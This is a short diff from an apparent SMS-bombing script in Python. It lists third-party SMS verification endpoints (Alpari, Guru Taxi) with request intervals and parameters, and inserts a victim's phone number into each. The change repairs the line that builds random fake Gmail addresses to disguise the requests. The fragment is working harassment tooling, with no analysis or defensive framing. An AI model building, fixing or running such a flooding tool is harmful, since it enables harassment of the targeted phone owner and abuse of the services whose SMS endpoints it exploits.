@@ -16,7 +16,7 @@ def initAPI(phone):
     # 短信接口API 请求间隔时间 备注 请求方式 请求参数 需要SESSION的先决请求URL以及Referer
     APIList = [
         ["https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/", 60, "alpari", "GET",
-         "client_type": "personal", "email": random.choice(string.ascii_letters) for _ in range(9) + "@gmail.ru", "mobile_phone": phone, "deliveryOption": "sms"}, ""],
+         "client_type": "personal", "email": f"{''.join(random.choice(string.ascii_letters) for _ in range(6))}@gmail.ru", "mobile_phone": phone, "deliveryOption": "sms"}, ""],
 
         ["https://guru.taxi/api/v1/driver/session/verify", 60, "Guru Taxi", "GET", {"phone": {"code": 1, "number": phone[1:]}},
          ""],
